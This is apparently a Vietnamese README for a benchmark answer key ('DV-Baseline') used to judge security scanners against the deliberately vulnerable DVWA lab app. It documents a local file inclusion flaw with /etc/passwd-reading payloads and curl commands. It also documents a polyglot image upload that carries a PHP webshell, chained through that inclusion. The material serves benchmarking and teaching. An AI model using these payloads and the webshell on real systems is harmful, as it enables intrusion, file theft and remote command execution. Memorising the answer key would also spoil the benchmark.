# DV-baseline

Tài liệu này (**"DV-Baseline"**) được xây dựng nhằm mục đích thiết lập một **"Ground Truth" (Sự thật nền)** chi tiết, có thể kiểm chứng và định lượng được cho ứng dụng Damn Vulnerable Web Application (DVWA).

Mục tiêu chính là cung cấp một bộ dữ liệu tham chiếu (*benchmark dataset*) chuẩn hóa để đo lường, so sánh và xác thực hiệu suất của các công cụ quét bảo mật ứng dụng động (DAST) và các giải pháp phân tích bảo mật tự động khác.  
Tài liệu này đóng vai trò là **"bảng đáp án"** để đánh giá:

- **Độ phủ (Coverage):** Khả năng phát hiện các lỗ hổng ở các mức độ phức tạp khác nhau (*Low, Medium, High*).

- **Độ chính xác (Accuracy):** Khả năng phân biệt giữa lỗ hổng thực sự (*True Positive*) và các báo động giả (*False Positive*) bằng cách phân tích cấp độ *"Impossible"*.  

- **Độ sâu (Depth):** Khả năng vượt qua (*bypass*) các cơ chế phòng vệ (*filter*) cơ bản và nâng cao của công cụ.

# Local File Inclusion (LFI) - (OWASP A03:2021 - Injection)
## Method
Phân tích mã nguồn cho thấy một cơ chế `Whitelist (fnmatch("file*", ... ))` đã được triển khai nhưng bị lỗi, cho phép dữ liệu do người dùng kiểm soát đi vào hàm `include()` dẫn tới LFI.

## Vulnerable Code 
### vulnerabilities/fi/source/high.php

```
if( !fnmatch( "file*", $file ) && $file != "include.php" ) { ...
```
Hàm `fnmatch()` với pattern "file*" (bất cứ thứ gì bắt đầu bằng "file"). Nó không chỉ khớp với 'file1.php', mà nó còn khớp với:
-   PHP Wrapper: *'file:///etc/passwd'*
-   Path Traversal: *'file/../../../../../../etc/passwd'*
-   Các file bắt đàu bằng "file*". Ví dụ :"file4.php, file5.php".
## Proof of Value - PoV
### Kịch bản 1: Đọc tệp tin hệ thống qua PHP Wrapper
* Tác động: Lộ lọt dữ liệu nhạy cảm.
* Payload: 
```
file:///etc/passwd
```
* Ví dụ (cURL):
```bash
    curl -G 'http://[DVWA_IP]/vulnerabilities/fi/' \
         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
         --data-urlencode 'page=file:///etc/passwd'
```
* Kết quả: *Response* trả về sẽ chứa dữ liệu của **/etc/passwd**

### Kịch bản 2: Đọc tệp tin hệ thống qua Path Traversal
* Tác động: Lộ lọt dữ liệu nhạy cảm.
* Payload: 
```
file/../../../../../../etc/passwd
```
* Ví dụ (cURL):
```bash
    curl -G 'http://[DVWA_IP]/vulnerabilities/fi/' \
         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
         --data-urlencode 'page=file/../../../../../../etc/passwd'
```
* Kết quả: *Response* trả về sẽ chứa dữ liệu của **/etc/passwd**

### Screenshots
- Đọc tệp tin hệ thống qua PHP Wrapper
<img width="2027" height="1291" alt="image" src="https://github.com/user-attachments/assets/05e2c76f-822b-4a9b-883e-c03d1673de11" />

- Đọc tệp tin hệ thống qua Path Traversal
<img width="2029" height="1338" alt="image" src="https://github.com/user-attachments/assets/026e60e3-6cc3-430e-ad90-a7f6754199c3" />

# Unrestricted File Upload (OWASP A08:2021 - Software and Data Integrity Failures)

## Method
Phân tích chức năng tải lên tại `/vulnerabilities/upload/` cho thấy cơ chế xác thực tệp tin không đầy đủ. Cho phép người dùng upload image `(jpg, jpeg, png)` với **content tuỳ ý**

## Vulnerable Code 
### vulnerabilities/upload/source/high.php
```
 // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {
```
Mặc dù ứng dụng đã sử dụng  `getimagesize()` để xác nhận nó là ảnh và kiểm tra ext trong whitelist `["jpg", "jpeg", "png"]` nhưng lại **không phân tích nội dung bên trong của tệp**.

Điều này cho phép kẻ tấn công tạo ra một tệp *polyglot* — một tệp vừa là `image/jpeg` hợp lệ, vừa chứa mã PHP độc hại — và tải nó lên máy chủ thành công.

---

## Proof of Value (PoV)
Kịch bản này chứng minh rằng một tệp chứa mã PHP có thể được tải lên và lưu trữ trên máy chủ, qua mặt cơ chế kiểm tra tệp ảnh.

### Tải lên tệp Polyglot (JPEG + PHP)
- **Mục tiêu:** Tải lên một tệp webshell đơn giản có đuôi `.jpg`.
- **Ý tưởng:** Tạo một tệp `shell.jpg` là một tệp JPEG hợp lệ nhưng có chèn mã PHP vào dữ liệu EXIF hoặc metadata.

**Baseline JSON (mô tả tệp):**
```json
{
  "filename": "shell.jpg",
  "Content-Type": "image/jpeg",
  "content_summary": "GIF89a; <?php system($_GET['cmd']); ?>"
}
```

**Ví dụ nội dung tệp (khái quát):**
```
[Dữ liệu JPEG hợp lệ] ... <?php system($_GET['cmd']); ?> ... [Dữ liệu JPEG còn lại]
```

**Lệnh Tải lên (cURL):**
```bash
curl -i -X POST 'http://[DVWA_IP]/vulnerabilities/upload/'      -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]'      -F 'MAX_FILE_SIZE=100000'      -F 'uploaded=@shell.jpg;type=image/jpeg'      -F 'Upload=Upload'
```

**Kết quả mong đợi:**
- Response của máy chủ sẽ xác nhận tệp đã được tải lên thành công và có thể tiết lộ đường dẫn lưu trữ, ví dụ:
```
...
<pre>../../hackable/uploads/shell.jpg</pre>
...
```
- Điều này xác nhận rằng tệp `shell.jpg` (chứa mã PHP) hiện đang được lưu trữ trên hệ thống.

---

## Screenshots
- Tạo file polyglot đơn giản với magic header **GIF89a**
  <img width="1348" height="102" alt="image" src="https://github.com/user-attachments/assets/90b9dfd5-1675-4c2d-830e-f38b813e1511" />

- Upload file **shell.jpg** chứa mã độc gọi *webshell*
  <img width="2557" height="1017" alt="image" src="https://github.com/user-attachments/assets/f78bc443-378b-44e9-9776-168947e73427" />
  
- Trigger tới **shell.jpg** bằng lỗ hổng `File Inclusion`
<img width="2024" height="630" alt="image" src="https://github.com/user-attachments/assets/e8f46328-d5cf-4f22-86b9-fa02f20253fd" />





